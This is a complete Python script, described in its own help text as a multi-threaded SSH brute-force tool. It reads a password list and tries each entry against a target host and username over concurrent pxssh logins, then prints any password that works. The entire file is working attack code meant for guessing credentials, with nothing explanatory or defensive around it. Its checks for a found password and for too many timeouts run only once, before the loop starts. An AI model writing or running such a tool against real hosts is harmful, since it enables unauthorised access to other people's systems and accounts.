#!/usr/bin/python

from pexpect import pxssh
import argparse
import time
import threading

maxConnections = 5
connection_lock = threading.BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0


def connect(host, user, password, release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print('[+] Password Found: ' + password)
        Found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


def main():
    parser = argparse.ArgumentParser(description='multi-thread ssh brute tool')
    parser.add_argument('-H', metavar='host', help='specify target host')
    parser.add_argument('-u', metavar='user', help='username')
    parser.add_argument('-F', metavar='passwdFile',
                        help='specify password file')

    args = parser.parse_args()

    host = args.H
    user = args.u
    passwdfile = args.F

    if host == None or passwdfile == None or user == None:
        #print('son of bitch')
        parser.print_help()
        exit(0)

    if Found:
        print('[*] Exiting: Password Found')
        exit(0)

    if Fails > 5:
        print('[!] Exiting: Too Many Socket Timeouts')
        exit(0)

    with open(passwdfile, 'r') as f:
        for line in f.readlines():
            password = line.strip('\r').strip('\n')
            connection_lock.acquire()
            print('[-] Testing: ' + str(password))
            t = threading.Thread(target=connect, args=(
                host, user, password, True))
            t.start()


if __name__ == '__main__':
    main()
